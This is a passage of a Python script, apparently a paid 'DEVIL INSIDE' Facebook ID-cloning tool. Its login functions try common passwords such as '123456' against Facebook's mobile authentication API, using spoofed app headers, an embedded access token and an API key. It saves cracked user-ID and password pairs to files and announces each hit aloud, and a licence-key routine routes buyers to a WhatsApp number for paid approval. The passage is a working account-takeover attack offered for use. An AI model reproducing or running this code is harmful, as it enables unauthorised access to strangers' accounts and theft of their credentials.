                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mDEVIL\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/DEVIL-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:time.sleep(30)
def login4(uid):
    global oks,loop,cps
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mDEVIL\33[38;5;37m-\x1b[38;5;46mS4\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
        sys.stdout.flush()
        ua = generate_user_agent()
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            data = {'adid':str(uuid.uuid4()),
            'format': 'json',
            'device_id':str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password', 
            'error_detail_type': 'button_with_disabled', 
            'source': 'device_based_login', 
            'email':str(uid),
            'password':str(pw),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'generate_session_cookies': '1', 
            'meta_inf_fbmeta': '', 
            'advertiser_id':str(uuid.uuid4()),
            'currently_logged_in_userid': '0', 
            'locale': 'en_US',
            'client_country_code': 'US', 
            'method': 'auth.login', 
            'fb_api_req_friendly_name': 'authenticate', 
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
            'api_key': '882a8490361da98702bf97a021ddc14d'}
            head = {'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Host': 'graph.facebook.com', 
            'X-FB-Net-HNI': '25227',
            'X-FB-SIM-HNI': '29752',
            'X-FB-Connection-Type': 'MOBILE.LTE', 
            'X-Tigon-Is-Retry': 'False', 
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
            'x-fb-device-group': '5120', 
            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
            'X-FB-Request-Analytics-Tags': 'graphservice', 
            'X-FB-HTTP-Engine': 'Liger', 
            'X-FB-Client-IP': 'True', 
            'X-FB-Server-Cluster': 'True', 
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
            'Content-Length': '706'}
            url = "https://b-graph.facebook.com/auth/login"
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:            	
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mDEVIL\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/DEVIL-M4-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mDEVIL\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/DEVIL-M4-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:time.sleep(30)
def meyexudi():
  os.system('clear')
  print(logo)
  
  uuid = "md"+str(os.getuid())+"devil"+str(os.getuid())+"FREE.TOOL"
  id = ''.join(uuid)
  try:
    httpCaht = requests.get(f"https://github.com/Sherry-754/Devil-Inside/blob/main/approval.txt").text
    if id in httpCaht:
      msg = str(os.geteuid())
      print()
      pass
    else:
      print(" \033[32;1m[+] Your Key : "+id)
      print(' \x1b[38;5;208m╔══[𝟷]💥  FREE-FIRE-TIK-TOK- ID CLONING')      
      print(' \x1b[1;98m║══[•]💥  ONLY ACTIVE ID CLONE 100%')
      print(' \x1b[1;93m║══[•]💥  CP ID WILL BE LOGIN 80%')
      print(' \x1b[1;97m║══[•]💥  WI-FI  AND DATA BOTH WORKING 100%')
      print(' \x1b[38;5;50m║══[•]💥  5 DAY 150 RS ')
      print(' \x1b[1;95m║══[•]💥  15 DAY 300 Rs ')
      print(' \x1b[38;5;50m║══[•]💥  30 DAY 800 Rs ')
      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   DEVIL,   INSIDE ,    Please,   Send,   Your,   Key,"')
      print(" \x1b[0m║══[KEY]  : "+id)
      uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
      input(' \033[1;30m╚══[•] IF U WANT APPROVAL THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923230030521?text='+tks),approval()       
  except:
    sys.exit()
print(logo)
meyexudi()
main()


main()

